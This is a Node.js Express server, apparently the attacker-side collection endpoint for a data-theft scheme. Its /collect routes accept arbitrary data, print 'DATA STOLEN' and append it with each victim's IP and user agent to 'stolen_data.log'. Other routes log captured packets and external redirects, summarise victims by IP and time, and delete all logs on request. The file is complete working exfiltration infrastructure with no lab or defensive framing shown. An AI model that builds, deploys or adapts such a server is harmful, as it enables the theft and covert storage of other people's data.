const express = require("express");
const fs = require("fs");

const app = express();
app.use(express.json());

// Store collected data in memory and file
let collectedData = [];
let capturedPackets = [];

// External redirect logging endpoint
app.post("/external-redirect", (req, res) => {
    const redirectData = req.body;
    
    console.log(`🌐 EXTERNAL REDIRECT LOGGED: ${redirectData.external_url}`);
    console.log(`🌐 Domain: ${redirectData.domain} | Redirect #${redirectData.redirectNumber}`);
    
    const redirectEntry = {
        ...redirectData,
        loggedAt: new Date().toISOString(),
        server: "logger-server",
        type: "external_redirect"
    };
    
    collectedData.push(redirectEntry);
    
    // Save external redirects to separate file
    fs.appendFileSync('external_redirects.log', JSON.stringify(redirectEntry) + '\n');
    
    res.json({ 
        status: "external_redirect_logged", 
        redirectId: collectedData.length,
        timestamp: new Date().toISOString()
    });
});

// GET endpoint (for backward compatibility)
app.get("/collect",(req,res)=>{
    const data = req.query.data;
    console.log("DATA STOLEN:", data);
    
    const logEntry = {
        timestamp: new Date().toISOString(),
        method: "GET",
        data: data,
        userAgent: req.get('User-Agent'),
        ip: req.ip
    };
    
    collectedData.push(logEntry);
    
    // Save to file
    fs.appendFileSync('stolen_data.log', JSON.stringify(logEntry) + '\n');
    
    res.send("received");
});

// POST endpoint (for enhanced data collection)
app.post("/collect", (req, res) => {
    const data = req.body;
    console.log("Enhanced data collection:", data);
    
    const logEntry = {
        timestamp: new Date().toISOString(),
        method: "POST",
        data: data,
        userAgent: req.get('User-Agent'),
        ip: req.ip
    };
    
    collectedData.push(logEntry);
    
    // Save to file
    fs.appendFileSync('stolen_data.log', JSON.stringify(logEntry) + '\n');
    
    res.json({ status: "success", message: "Data logged successfully" });
});

// Packet capture endpoint
app.post("/packet-capture", (req, res) => {
    const packet = req.body;
    
    console.log(`📡 PACKET CAPTURE LOGGED: ${packet.method} to ${packet.url}`);
    console.log(`📡 Size: ${packet.size} bytes | Timestamp: ${packet.timestamp}`);
    
    const packetEntry = {
        ...packet,
        loggedAt: new Date().toISOString(),
        server: "logger-server"
    };
    
    capturedPackets.push(packetEntry);
    
    // Save packets to separate file
    fs.appendFileSync('captured_packets.log', JSON.stringify(packetEntry) + '\n');
    
    res.json({ 
        status: "packet_logged", 
        packetId: capturedPackets.length,
        timestamp: new Date().toISOString()
    });
});

// View all collected data
app.get("/data", (req, res) => {
    res.json({
        total_entries: collectedData.length,
        data: collectedData,
        packets_captured: capturedPackets.length
    });
});

// View captured packets
app.get("/packets", (req, res) => {
    res.json({
        total_packets: capturedPackets.length,
        packets: capturedPackets,
        summary: {
            total_size: capturedPackets.reduce((sum, p) => sum + (p.size || 0), 0),
            unique_urls: [...new Set(capturedPackets.map(p => p.url))].length,
            methods: [...new Set(capturedPackets.map(p => p.method))],
            time_span: capturedPackets.length > 0 ? {
                first: capturedPackets[0]?.timestamp,
                last: capturedPackets[capturedPackets.length - 1]?.timestamp
            } : null
        }
    });
});

// Clear collected data
app.delete("/data", (req, res) => {
    const count = collectedData.length;
    const packetCount = capturedPackets.length;
    collectedData = [];
    capturedPackets = [];
    
    if (fs.existsSync('stolen_data.log')) {
        fs.unlinkSync('stolen_data.log');
    }
    if (fs.existsSync('captured_packets.log')) {
        fs.unlinkSync('captured_packets.log');
    }
    if (fs.existsSync('external_redirects.log')) {
        fs.unlinkSync('external_redirects.log');
    }
    
    res.json({ 
        status: "success", 
        message: `Cleared ${count} data entries, ${packetCount} packets, and external redirects log` 
    });
});

// Network analysis endpoint
app.get("/analysis", (req, res) => {
    const analysis = {
        total_data_entries: collectedData.length,
        total_packets: capturedPackets.length,
        data_collection_methods: {},
        packet_methods: {},
        unique_ips: [...new Set([...collectedData.map(d => d.ip), ...capturedPackets.map(p => p.ip)])],
        time_analysis: {
            data_span: collectedData.length > 0 ? {
                first: collectedData[0]?.timestamp,
                last: collectedData[collectedData.length - 1]?.timestamp
            } : null,
            packet_span: capturedPackets.length > 0 ? {
                first: capturedPackets[0]?.timestamp,
                last: capturedPackets[capturedPackets.length - 1]?.timestamp
            } : null
        },
        traffic_volume: {
            total_data_size: capturedPackets.reduce((sum, p) => sum + (p.size || 0), 0),
            average_packet_size: capturedPackets.length > 0 ? 
                capturedPackets.reduce((sum, p) => sum + (p.size || 0), 0) / capturedPackets.length : 0
        }
    };
    
    // Count methods
    collectedData.forEach(entry => {
        analysis.data_collection_methods[entry.method] = 
            (analysis.data_collection_methods[entry.method] || 0) + 1;
    });
    
    capturedPackets.forEach(packet => {
        analysis.packet_methods[packet.method] = 
            (analysis.packet_methods[packet.method] || 0) + 1;
    });
    
    res.json(analysis);
});

app.listen(6000,()=>{
    console.log("Logger running on 6000");
    console.log("Available endpoints:");
    console.log("- GET /collect?data=<data>");
    console.log("- POST /collect (JSON body)");
    console.log("- POST /external-redirect (external website logging)");
    console.log("- POST /packet-capture (network packet logging)");
    console.log("- GET /data (view all collected data)");
    console.log("- GET /packets (view captured packets)");
    console.log("- GET /analysis (network traffic analysis)");
    console.log("- DELETE /data (clear all data)");
    console.log("Files created:");
    console.log("- stolen_data.log (collected data)");
    console.log("- captured_packets.log (network packets)");
    console.log("- external_redirects.log (external website redirects)");
});
